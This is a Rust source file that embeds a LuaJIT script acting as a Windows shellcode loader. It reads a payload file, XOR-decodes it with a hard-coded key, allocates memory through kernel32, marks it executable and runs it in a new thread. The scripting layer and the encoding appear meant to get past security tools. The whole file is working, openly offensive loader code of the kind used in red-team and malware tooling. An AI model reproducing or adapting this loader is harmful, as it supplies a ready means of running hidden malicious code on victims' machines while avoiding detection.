use mlua::{Lua, StdLib, Table};

fn main() {
    unsafe {

        let shellcode: Vec<u8> = include_bytes!("sc.bin").to_vec();
        let payload_len: usize = shellcode.len();
        let lua: Lua = Lua::unsafe_new();

        lua.load_from_std_lib(StdLib::FFI).unwrap();
        lua.load_from_std_lib(StdLib::BIT).unwrap();

        let payload_table: Table = lua.create_table().unwrap();
        payload_table.set(1, shellcode).unwrap();

        let globals = lua.globals();

        globals.set("payload", payload_table).unwrap();
        globals.set("payloadLen", payload_len).unwrap();

        lua.load(
            r#"

                ffi.cdef[[
                    typedef unsigned long DWORD;
                    typedef void* LPVOID;
                    typedef LPVOID HANDLE;
                    typedef DWORD (*LPTHREAD_START_ROUTINE)(LPVOID);

                    HANDLE CreateThread(
                        LPVOID lpThreadAttributes,
                        size_t dwStackSize,
                        LPTHREAD_START_ROUTINE lpStartAddress,
                        LPVOID lpParameter,
                        DWORD dwCreationFlags,
                        DWORD* lpThreadId
                    );

                    LPVOID VirtualAlloc(
                        LPVOID lpAddress,
                        size_t dwSize,
                        DWORD    flAllocationType,
                        DWORD    flProtect
                    );

                    bool VirtualProtect(
                        LPVOID lpAddress,
                        size_t dwSize,
                        DWORD  flNewProtect,
                        DWORD* lpflOldProtect
                    );

                    DWORD WaitForSingleObject(
                        HANDLE hHandle,
                        DWORD  dwMilliseconds
                    );

                ]]

                local MEM_COMMIT = 0x00001000
                local MEM_RESERVE = 0x00002000
                local PAGE_READ_WRITE = 0x04
                local PAGE_EXECUTE_READ = 0x20

                local kernel32 = ffi.load("kernel32")

                local memCmt = bit.bor(MEM_COMMIT, MEM_RESERVE) 

                execMem = kernel32.VirtualAlloc(nil, payloadLen, memCmt, PAGE_READ_WRITE)
                print(execMem)

                local shellcode = payload[1]

                local buf = ffi.new("uint8_t[?]", #shellcode)

                local j = 1
                local key = { 0x73, 0x65, 0x63, 0x72, 0x65, 0x74, 0x6b, 0x65, 0x79 } 
                for i = 1, #shellcode do
                    if j > #key then
                        j = 1
                    end
                    shellcode[i] = bit.bxor(shellcode[i], key[j])
                    j = j + 1
                end

                for i = 1, #shellcode do
                    buf[i - 1] = shellcode[i]
                end

                ffi.copy(execMem, buf, payloadLen)

                print("copied buf: ", payloadLen)
                
                local oldProtect = ffi.new("DWORD[0]")
                success = kernel32.VirtualProtect(execMem, payloadLen, PAGE_EXECUTE_READ, oldProtect)

                if success == 0 then
                    print("Error changing protections")
                end

                local threadProc = ffi.cast("LPTHREAD_START_ROUTINE", execMem)
                local threadId = ffi.new("DWORD[0]")

                print("Executing thread")

                local hThread = kernel32.CreateThread(nil, 0, threadProc, nil, 0, threadId)

                print("thread id ", threadId[0])

                if threadId[0] > 0 then
                    kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)
                end

                print("done")

            "#,
        ).set_name("lualoader")
        .exec().unwrap();
    }
}